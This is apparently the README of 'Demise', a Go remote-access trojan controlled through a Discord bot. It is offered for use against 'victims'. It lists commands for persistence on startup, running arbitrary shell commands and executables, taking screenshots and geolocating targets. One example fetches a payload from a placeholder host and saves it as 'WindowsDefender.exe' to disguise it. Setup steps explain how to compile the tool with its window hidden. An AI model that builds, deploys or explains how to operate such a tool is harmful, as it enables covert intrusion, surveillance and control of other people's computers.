# Demise

Demise is Golang malware that uses Discord for communication. 

![image](https://user-images.githubusercontent.com/99378532/184524385-89bda0f6-b46d-4e5e-868f-f044dac0ae1d.png)

# Demo

![image](https://user-images.githubusercontent.com/99378532/184524374-a18668bc-7888-4912-b4be-269bedde7b6e.png)

# Commands

show victims connected
$victims

extract a zip file
$unzip <username> <.zip file on drive> <directory to extract in>
Example:
$unzip DESKTOP-2HJUUK6\Tod main.zip C:\msys64\home\Tod\projects\go\src\github.com\0xSegFaulted\

run Demise on startup
$startup <username>
Example
$startup DESKTOP-2HJUUK6\Tod

run an executable (some executables require admin)
$run <username> <location of exe>
Example
$run DESKTOP-2HJUUK6\Tod file.exe

download file
$dl <username> <url> <name of file>
Example
$dl DESKTOP-2HJUUK6\Tod http://somesite.com/payload.exe WindowsDefender.exe

run commands
$shell <username> <command> <flags... optional>
Example 
$shell DESKTOP-2HJUUK6\Tod whoami

screenshot desktop
$ss <username>
Example
$ss DESKTOP-2HJUUK6\Tod

get IP
$ip <username>
Example
$ip DESKTOP-2HJUUK6\Tod

kill session
$kill <username>
$kill DESKTOP-2HJUUK6\Tod

geolocate
$geoloc <username>
$geoloc DESKTOP-2HJUUK6\Tod

# HOWTO

1. Download the source code
2. Download golang https://go.dev choose the correct install for your os
3. make a server (this is a discord bot RAT)
4. make a bot. I won't show you how because there are many tutorial on youtube https://www.youtube.com/watch?v=7A-bnPlxj4k&t=20s
5. add the bot to your server and make a new text channel in your server
6. copy your bot's token and the id of the text channel you just created
![image](https://user-images.githubusercontent.com/99378532/192041038-0c5dcd79-a98b-45ea-88fe-800bb28e5fbe.png)
7. put the channel id here at the beginning of the source code 
![image](https://user-images.githubusercontent.com/99378532/192041183-22706c07-32f7-4763-b822-d90cdd3c092b.png)
8. put your bot's token here
9. compile with a command similiar to this one "go build -ldflags="-s -w -H=windowsgui" ." -H=windowsgui will hide the window

if the bot doesn't respond to commands change your intents


